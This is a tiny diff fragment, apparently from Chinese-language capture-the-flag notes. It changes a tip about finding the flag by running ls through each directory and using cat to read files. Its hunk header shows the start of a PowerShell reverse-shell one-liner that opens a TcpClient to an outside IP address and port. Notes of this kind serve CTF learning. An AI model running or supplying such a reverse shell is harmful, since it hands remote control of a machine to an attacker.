@@ -44,5 +44,5 @@ $c=New-Object System.Net.Sockets.TcpClient('160.202.254.160',15363);$s=$c.GetStr
 
  cat 文件名 看文件内容
 
-◦ 不知道 flag 在哪就一层一层翻，先 ls，进去了再 ls
+ 不知道 flag 在哪就一层一层翻，先 ls，进去了再 ls
 
